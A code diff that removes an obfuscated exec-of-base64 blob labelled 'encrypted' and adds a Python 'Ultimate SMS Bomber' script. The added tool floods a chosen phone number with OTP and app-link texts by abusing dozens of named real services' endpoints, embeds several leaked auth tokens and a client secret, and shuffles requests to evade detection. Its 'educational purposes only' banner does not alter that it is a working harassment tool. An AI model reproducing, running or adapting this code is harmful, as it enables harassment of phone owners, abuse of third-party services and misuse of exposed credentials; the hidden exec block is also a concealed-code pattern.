@@ -1,4 +1,547 @@
-# 🚫 Do not modify! Encrypted Python code below:
+import requests
+import logging
+import random
+import time
+import threading
+import sys
+from datetime import datetime
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode("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")).decode('utf-8'))
+# Configure logging with emojis
+logging.basicConfig(
+    format='%(asctime)s - %(message)s',
+    level=logging.INFO,
+    handlers=[logging.StreamHandler()]
+)
+logger = logging.getLogger(__name__)
+
+class UltimateSMSBomber:
+    def __init__(self, phone_number, country_code="91"):
+        self.phone = phone_number
+        self.country_code = country_code
+        self.user_agent = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
+        self.active = True
+        self.success_count = 0
+        self.fail_count = 0
+        self.api_stats = {}
+        self.lock = threading.Lock()
+        
+        # Load ALL APIs from the provided JSON
+        self.apis = self._load_all_apis()
+        
+    def _load_all_apis(self):
+        """Load all APIs from the provided JSON structure"""
+        apis = []
+        
+        # Indian APIs (country code 91)
+        indian_apis = [
+            # ConfirmTKT
+            {
+                "name": "ConfirmTKT",
+                "method": "GET",
+                "url": "https://securedapi.confirmtkt.com/api/platform/register",
+                "params": {"newOtp": "true", "mobileNumber": self.phone},
+                "identifier": "false"
+            },
+            # JustDial
+            {
+                "name": "JustDial",
+                "method": "GET",
+                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
+                "params": {"mobile": self.phone},
+                "identifier": "sent"
+            },
+            # Allen Solly
+            {
+                "name": "Allen Solly",
+                "method": "POST",
+                "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
+                "data": {"mobileoremail": self.phone, "name": "markluther"},
+                "identifier": "true"
+            },
+            # Frotels
+            {
+                "name": "Frotels",
+                "method": "POST",
+                "url": "https://www.frotels.com/appsendsms.php",
+                "data": {"mobno": self.phone},
+                "identifier": "sent"
+            },
+            # GAPOON
+            {
+                "name": "GAPOON",
+                "method": "POST",
+                "url": "https://www.gapoon.com/userSignup",
+                "data": {
+                    "mobile": self.phone,
+                    "email": "noreply@gmail.com",
+                    "name": "LexLuthor"
+                },
+                "identifier": "1"
+            },
+            # Housing
+            {
+                "name": "Housing",
+                "method": "POST",
+                "url": "https://login.housing.com/api/v2/send-otp",
+                "data": {"phone": self.phone},
+                "identifier": "Sent"
+            },
+            # Porter
+            {
+                "name": "Porter",
+                "method": "POST",
+                "url": "https://porter.in/restservice/send_app_link_sms",
+                "data": {"phone": self.phone, "referrer_string": "", "brand": "porter"},
+                "identifier": "true"
+            },
+            # Cityflo
+            {
+                "name": "Cityflo",
+                "method": "POST",
+                "url": "https://cityflo.com/website-app-download-link-sms/",
+                "data": {"mobile_number": self.phone},
+                "identifier": "sent"
+            },
+            # NNNOW
+            {
+                "name": "NNNOW",
+                "method": "POST",
+                "url": "https://api.nnnow.com/d/api/appDownloadLink",
+                "data": {"mobileNumber": self.phone},
+                "identifier": "true"
+            },
+            # AJIO
+            {
+                "name": "AJIO",
+                "method": "POST",
+                "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
+                "data": {
+                    "firstName": "xxps",
+                    "login": "wiqpdl223@wqew.com",
+                    "password": "QASpw@1s",
+                    "genderType": "Male",
+                    "mobileNumber": self.phone,
+                    "requestType": "SENDOTP"
+                },
+                "identifier": "1"
+            },
+            # HappyEasyGo
+            {
+                "name": "HappyEasyGo",
+                "method": "GET",
+                "url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
+                "params": {"phone": f"91 {self.phone}"},
+                "identifier": "true"
+            },
+            # Unacademy
+            {
+                "name": "Unacademy",
+                "method": "POST",
+                "url": "https://unacademy.com/api/v1/user/get_app_link/",
+                "data": {"phone": self.phone},
+                "identifier": "sent"
+            },
+            # Treebo
+            {
+                "name": "Treebo",
+                "method": "POST",
+                "url": "https://www.treebo.com/api/v2/auth/login/otp/",
+                "data": {"phone_number": self.phone},
+                "identifier": "sent"
+            },
+            # Airtel
+            {
+                "name": "Airtel",
+                "method": "GET",
+                "url": "https://www.airtel.in/referral-api/core/notify",
+                "params": {"messageId": "map", "rtn": self.phone},
+                "identifier": "Success"
+            },
+            # PharmEasy
+            {
+                "name": "PharmEasy",
+                "method": "POST",
+                "url": "https://pharmeasy.in/api/auth/requestOTP",
+                "json": {"contactNumber": self.phone},
+                "identifier": "resendSmsCounter"
+            },
+            # MylesCars
+            {
+                "name": "MylesCars",
+                "method": "POST",
+                "url": "https://www.mylescars.com/usermanagements/chkContact",
+                "data": {"contactNo": self.phone},
+                "identifier": "success@::::"
+            },
+            # Grofers
+            {
+                "name": "Grofers",
+                "method": "POST",
+                "url": "https://grofers.com/v2/accounts/",
+                "data": {"user_phone": self.phone},
+                "headers": {
+                    "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
+                },
+                "identifier": "We have sent"
+            },
+            # Dream11
+            {
+                "name": "Dream11",
+                "method": "POST",
+                "url": "https://api.dream11.com/sendsmslink",
+                "data": {
+                    "siteId": "1",
+                    "mobileNum": self.phone,
+                    "appType": "androidfull"
+                },
+                "identifier": "true"
+            },
+            # Cashify
+            {
+                "name": "Cashify",
+                "method": "GET",
+                "url": "https://www.cashify.in/api/cu01/v1/app-link",
+                "params": {"mn": self.phone},
+                "identifier": "Successfully"
+            },
+            # Paytm
+            {
+                "name": "Paytm",
+                "method": "POST",
+                "url": "https://commonfront.paytm.com/v4/api/sendsms",
+                "data": {
+                    "phone": self.phone,
+                    "guid": "2952fa812660c58dc160ca6c9894221d"
+                },
+                "identifier": "202"
+            },
+            # KFC India
+            {
+                "name": "KFC India",
+                "method": "POST",
+                "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
+                "headers": {
+                    "Referer": "https://online.kfc.co.in/login",
+                    "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
+                },
+                "json": {
+                    "AuthorizedFor": "3",
+                    "phoneNumber": self.phone,
+                    "Resend": "false"
+                },
+                "identifier": "true"
+            },
+            # IndiaLends
+            {
+                "name": "IndiaLends",
+                "method": "POST",
+                "url": "https://indialends.com/internal/a/mobile-verification_v2.ashx",
+                "headers": {"Referer": "https://indialends.com/personal-loan"},
+                "data": {
+                    "aeyder03teaeare": "1",
+                    "ertysvfj74sje": self.country_code,
+                    "jfsdfu14hkgertd": self.phone,
+                    "lj80gertdfg": "0"
+                },
+                "identifier": "1"
+            },
+            # Flipkart
+            {
+                "name": "Flipkart",
+                "method": "POST",
+                "url": "https://www.flipkart.com/api/5/user/otp/generate",
+                "data": {"loginId": f"+{self.country_code}{self.phone}"},
+                "headers": {
+                    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                "identifier": "emailMask"
+            },
+            # Redbus
+            {
+                "name": "Redbus",
+                "method": "GET",
+                "url": "https://m.redbus.in/api/getOtp",
+                "params": {
+                    "number": self.phone,
+                    "cc": self.country_code,
+                    "whatsAppOpted": "false"
+                },
+                "identifier": "200"
+            }
+        ]
+        
+        # Multi-country APIs
+        multi_country_apis = [
+            # Qlean
+            {
+                "name": "Qlean",
+                "method": "POST",
+                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
+                "data": {"phone": f"{self.country_code}{self.phone}"},
+                "identifier": "request_id"
+            },
+            # Mail.ru
+            {
+                "name": "Mail.ru",
+                "method": "POST",
+                "url": "https://cloud.mail.ru/api/v2/notify/applink",
+                "data": {
+                    "phone": f"+{self.country_code}{self.phone}",
+                    "api": "2",
+                    "email": "email",
+                    "x-email": "x-email"
+                },
+                "identifier": "200"
+            },
+            # Tinder
+            {
+                "name": "Tinder",
+                "method": "POST",
+                "url": "https://api.gotinder.com/v2/auth/sms/send",
+                "data": {"phone_number": f"{self.country_code}{self.phone}"},
+                "params": {"auth_type": "sms", "locale": "ru"},
+                "identifier": "200"
+            },
+            # Youla
+            {
+                "name": "Youla",
+                "method": "POST",
+                "url": "https://youla.ru/web-api/auth/request_code",
+                "data": {"phone": f"+{self.country_code}{self.phone}"},
+                "identifier": ":6"
+            },
+            # IVI
+            {
+                "name": "IVI",
+                "method": "POST",
+                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+                "data": {"phone": f"{self.country_code}{self.phone}"},
+                "identifier": "true"
+            },
+            # Delitime
+            {
+                "name": "Delitime",
+                "method": "POST",
+                "url": "https://api.delitime.ru/api/v2/signup",
+                "data": {
+                    "SignupForm[username]": f"{self.country_code}{self.phone}",
+                    "SignupForm[device_type]": "3"
+                },
+                "identifier": "true"
+            },
+            # ICQ
+            {
+                "name": "ICQ",
+                "method": "POST",
+                "url": "https://www.icq.com/smsreg/requestPhoneValidation.php",
+                "data": {
+                    "msisdn": f"{self.country_code}{self.phone}",
+                    "locale": "en",
+                    "k": "ic1rtwz1s1Hj1O0r",
+                    "r": "45559"
+                },
+                "identifier": "200"
+            },
+            # IVI TV
+            {
+                "name": "IVI TV",
+                "method": "POST",
+                "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/",
+                "data": {
+                    "phone": f"{self.country_code}{self.phone}",
+                    "device": "Windows+v.43+Chrome+v.7453451",
+                    "app_version": "870"
+                },
+                "identifier": "true"
+            },
+            # Newton Schools
+            {
+                "name": "Newton Schools",
+                "method": "POST",
+                "url": "https://my.newtonschool.co/api/v1/user/otp/",
+                "data": {"phone": f"+{self.country_code}{self.phone}"},
+                "params": {"registration": True},
+                "identifier": "S003"
+            },
+            # QIWI
+            {
+                "name": "QIWI",
+                "method": "POST",
+                "url": "https://mobile-api.qiwi.com/oauth/authorize",
+                "data": {
+                    "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
+                    "username": f"{self.country_code}{self.phone}",
+                    "client_id": "android-qw",
+                    "client_secret": "zAm4FKq9UnSe7id"
+                },
+                "identifier": "confirmation_id"
+            }
+        ]
+        
+        # Combine all APIs
+        all_apis = indian_apis + multi_country_apis
+        
+        # Add country code to each API
+        for api in all_apis:
+            api["cc"] = self.country_code
+            
+        return all_apis
+    
+    def _typing_animation(self, message):
+        """Simulate typing animation"""
+        for char in message:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            time.sleep(0.02)
+        print()
+    
+    def _send_request(self, api):
+        try:
+            # Replace placeholders
+            url = api["url"].replace("{target}", self.phone).replace("{cc}", self.country_code)
+            
+            # Prepare request data
+            request_data = {}
+            if "data" in api:
+                request_data = {k: v.replace("{target}", self.phone).replace("{cc}", self.country_code) 
+                              if isinstance(v, str) else v 
+                              for k, v in api["data"].items()}
+            
+            headers = {
+                "User-Agent": self.user_agent,
+                **api.get("headers", {})
+            }
+            
+            cookies = api.get("cookies", {})
+            
+            # Send request
+            if api["method"] == "POST":
+                if "json" in api:
+                    response = requests.post(url, json=api["json"], headers=headers, cookies=cookies, timeout=10)
+                else:
+                    response = requests.post(url, data=request_data, headers=headers, cookies=cookies, timeout=10)
+            else:
+                params = request_data if "data" in api else api.get("params", {})
+                response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
+            
+            # Check success
+            identifier = api.get("identifier", "")
+            success = False
+            if identifier:
+                if identifier.isdigit():  # Status code check
+                    success = str(response.status_code) == identifier
+                else:  # Text identifier check
+                    success = identifier.lower() in response.text.lower()
+            else:
+                success = response.status_code == 200
+            
+            # Update stats
+            with self.lock:
+                if success:
+                    self.success_count += 1
+                    self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) + 1
+                    log_msg = f"🎯 [SUCCESS] {api['name']} → +{self.country_code}{self.phone}"
+                    self._typing_animation(log_msg)
+                else:
+                    self.fail_count += 1
+                    log_msg = f"❌ [FAILED] {api['name']} → Status: {response.status_code}"
+                    self._typing_animation(log_msg)
+            
+            return success
+            
+        except Exception as e:
+            with self.lock:
+                self.fail_count += 1
+                log_msg = f"⚠️ [ERROR] {api.get('name', 'Unknown')} → {str(e)}"
+                self._typing_animation(log_msg)
+            return False
+    
+    def start_bombing(self, delay=1, max_threads=15):
+        """Start multi-threaded bombing"""
+        self._typing_animation(f"🚀 Starting Ultimate SMS Bomber on +{self.country_code}{self.phone}")
+        self._typing_animation(f"🔍 Loaded {len(self.apis)} APIs for country code {self.country_code}")
+        self._typing_animation(f"⚡ Running with {max_threads} concurrent threads")
+        
+        while self.active:
+            # Shuffle APIs to avoid pattern detection
+            random.shuffle(self.apis)
+            
+            active_threads = []
+            
+            for api in self.apis:
+                if not self.active:
+                    break
+                
+                # Wait if too many active threads
+                while threading.active_count() > max_threads:
+                    time.sleep(0.1)
+                    if not self.active:
+                        break
+                
+                if not self.active:
+                    break
+                
+                # Create and start thread
+                t = threading.Thread(target=self._send_request, args=(api,))
+                t.start()
+                active_threads.append(t)
+                
+                time.sleep(delay)
+            
+            # Wait for current batch to complete
+            for t in active_threads:
+                t.join()
+    
+    def stop(self):
+        """Stop the bombing process"""
+        self.active = False
+        stats = self.get_stats()
+        self._typing_animation(f"\n🛑 Bombing stopped!")
+        self._typing_animation(f"✅ Success: {stats['success']}")
+        self._typing_animation(f"❌ Failed: {stats['failed']}")
+        self._typing_animation("📊 Top Performing APIs:")
+        for api, count in sorted(stats["api_stats"].items(), key=lambda x: x[1], reverse=True)[:5]:
+            self._typing_animation(f"   🏆 {api}: {count} hits")
+    
+    def get_stats(self):
+        """Get current stats"""
+        return {
+            "success": self.success_count,
+            "failed": self.fail_count,
+            "api_stats": self.api_stats
+        }
+
+def show_banner():
+    print("""
+    ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
+    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
+    ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
+    ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
+    ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
+    ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
+    """)
+    print("🔥 Ultimate SMS Bomber Pro | Developer: HiDDEN KING 🔥\n")
+    print("⚠️ WARNING: For educational purposes only! ⚠️\n")
+
+if __name__ == "__main__":
+    show_banner()
+    
+    phone = input("📱 Enter phone number (without country code): ").strip()
+    country_code = input("🌍 Enter country code (e.g. 91 for India): ").strip()
+    
+    bomber = UltimateSMSBomber(phone, country_code)
+    
+    try:
+        # Start in background thread
+        bomb_thread = threading.Thread(target=bomber.start_bombing)
+        bomb_thread.start()
+        
+        # Run until stopped
+        input("\nPress Enter to stop bombing...\n")
+        bomber.stop()
+        bomb_thread.join()
+        
+    except KeyboardInterrupt:
+        bomber.stop()
+        bomb_thread.join()
